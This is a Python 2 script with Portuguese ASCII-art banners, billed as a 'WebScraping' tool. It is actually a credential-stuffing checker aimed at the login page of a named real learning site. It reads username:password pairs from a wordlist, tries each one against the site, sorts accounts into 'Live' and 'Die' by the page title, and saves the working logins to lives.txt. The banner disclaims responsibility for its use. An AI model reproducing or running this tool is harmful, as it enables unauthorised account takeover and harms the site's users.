#!/usr/bin/python
# -*- coding: utf-8 -*-

# GitHub : https://github.com/Luth1er
from requests import session
import BeautifulSoup
import time
import sys
import os
cyanClaro="\033[1;36m"
vermelho = '\033[31;1m'
verde = '\033[32;1m'
azul = '\033[34;1m'
amarelo= '\033[1;33m'
os.system('clear')
KOZ = '''
         █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█ ▒▒▄▀▀▀▀▀▄▒▒▒▒▒▄▄▄▄▄▒▒▒
         █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█ ▒▐░▄░░░▄░▌▒▒▄█▄█▄█▄█▄▒
         █░░║║║╠─║─║─║║║║║╠─░░█ ▒▐░▀▀░▀▀░▌▒▒▒▒▒░░░▒▒▒▒
         █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█ ▒▒▀▄░═░▄▀▒▒▒▒▒▒░░░▒▒▒▒
         █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█ ▒▒▐░▀▄▀░▌▒▒▒▒▒▒░░░▒▒▒▒'''

ZYX = '''
                ▒▒▒▒▒▒▐███████▌     łαbørαŧøriø Ŧαηŧαรмα
                ▒▒▒▒▒▒▐░▀░▀░▀░▌ Coded : ૐ łuŧЋ1єr - ルシアー
                ▒▒▒▒▒▒▐▄▄▄▄▄▄▄▌     WebScraping Python
                ▄▀▀▀█▒▐░▀▀▄▀▀░▌▒█▀▀▀▄
                ▌▌▌▌▐▒▄▌░▄▄▄░▐▄▒▌▐▐▐▐
        +=========================================+
        |......♚ Solyd - Sistema de Ensinos.......|
        +-----------------------------------------+
        |♚ Coded: @Tweelv5 (Telegram)             |
        |♚Contact:www.facebook.com/TerminalRoot404|
        |♚ Date: 21/12/2016                       |
        |♚ Chanell:telegram.me/Phantasm_Lab       |
        |♚ Changing the Description of this tool  |
        |Won't made you the coder ^_^ !!!         |
        |♚Respect Coderz ^_^(Open_Source_Project) |
        |♚I take no responsibilities for the      |
        |  use of this program !                  |
        |♚  Contributions: @rootdanied            |
        +=========================================+
        |..♚ Use: youremailtest@gmail.com:12345 ..|
        +=========================================+
        +=========================================+
        |........♚ łαbørαŧøriø Ŧαηŧαรмα...........|
        +-----------------------------------------+
'''
XXX = '''
───▄█▌─▄─▄─▐█▄       ▄▄▀█▄───▄───────▄        ──▄────▄▄▄▄▄▄▄────▄───   
───██▌▀▀▄▀▀▐██       ▀▀▀██──███─────███       ─▀▀▄─▄█████████▄─▄▀▀──
───██▌─▄▄▄─▐██       ░▄██▀░█████░░░█████░░    ─────██─▀███▀─██──────
───▀██▌▐█▌▐██▀       ███▀▄███░███░███░███░▄   ───▄─▀████▀████▀─▄────
▄██████─▀─██████▄    ▀█████▀░░░▀███▀░░░▀██▀   ─▀█────██▀█▀██────█▀──
'''
Solyd = """
  +=====================================================+
  |...........♚ Solyd - Sistema de Ensinos ♚............|
  +-----------------------------------------------------+"""
 
GhostLab ="""  +=====================================================+
  |...............♚ łαbørαŧøriø Ŧαηŧαรмα................|
  +-----------------------------------------------------+"""
print (cyanClaro + KOZ)
print '---------------------------------------------------------'
print (azul + ZYX)  
WordList = raw_input(amarelo + "Digite o Nome da sua Wordlist.txt: ")
var = open(WordList, 'r').readlines()
fp = open("lives.txt", "w") #Quero salvar os logs da condição else para um arquivo txt....
for line in var:
	line = line.strip()
	USERNAME, PASSWORD = line.split(":")
	payload = { 'submit': 'login', 'username': USERNAME, 'password': PASSWORD }
	with session() as c:
		c.post('http://ensino.solyd.com.br/login/index.php', data = payload)
		response = c.get('http://ensino.solyd.com.br/user/profile.php')
	Beaut = BeautifulSoup.BeautifulSoup(response.content)
	soup = BeautifulSoup.BeautifulSoup(response.content.decode('utf-8','ignore'))
	Scraping = str(soup.title)
	try:
		if Scraping == '<title>Solyd - Ensino a Distância: Acesso ao site</title>':
			print (vermelho + Solyd)
			print vermelho+"  |       ♚ ✘✘✘ Die Acount... Login Down! ✘✘✘           |"
			print vermelho+"  |       ♚ ✘✘✘ Login Ou Senha Incorretos! ✘✘✘          |"
			print vermelho+"  |    ♚ ✅ Login ➣",line,"|"
			print vermelho+"  | ♚ ", Beaut.title.text,"      |"
			print (vermelho + GhostLab)			
		else:
			print (verde + Solyd)
			print "  |       ♚ ✅  Live Acount... Login Actived!            |"
			print "  |    ♚ ✅ Bem vindo ao sistema de Ensino Solyd         |"
			print "  |    ♚ ✅ Login ➣",line,"|"
			print "  | ♚ ", Beaut.title.text,"                    |"
			print (verde + GhostLab)
			try:
				
                            fp.write("%s\n" % line)
                            fp.flush()
						
			except IOError:
                            print "[✘] Falha ao salvar o arquivo no diretorio especificado"
                            sys.exit(1)
	except KeyboardInterrupt:
    		print "[-] Parado"
    		sys.exit(1)	
fp.close()
print "[✅] Logins salvos em arquivo chamado: Lives.txt! "
print " Obrigado Por Usar O Programa, Sinta A Vontade Para Melhora-lo! ^^\n", XXX


 	
